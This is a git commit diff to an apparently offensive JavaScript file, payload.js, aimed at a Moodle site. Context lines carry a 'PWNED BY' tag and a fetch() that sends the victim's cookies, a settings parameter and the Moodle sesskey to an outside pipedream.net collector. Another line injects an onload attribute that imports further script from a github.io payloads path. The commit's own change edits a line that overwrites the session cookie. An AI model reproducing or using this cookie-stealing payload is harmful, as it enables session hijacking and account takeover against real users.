646b2cbfb3bff79bbab256f467f6650791120fc2
NZRXHX <hachimi.nizar.etu@gmail.com>
2025-12-15 12:17:55 +0100

    Modify cookie handling in payload.js

--- payload.js
+++ payload.js
@@ -1,6 +1,6 @@
 //btw PWNED BY NZRXHX
 fetch('//eoizd5ecl7m1qqn.m.pipedream.net/?c='+document.cookie+"&id="+document.querySelector('[data-route="view-settings"]').getAttribute('data-route-param')+"&sesskey="+M.cfg.sesskey);
-document.cookie='MoodleSession=0;path=/';
+document.cookie='MoodleSession=;path=/';
 (() => {
   const targets = [
     `"onload="import('//nzrxhx.github.io/payloads/payload.js')`,
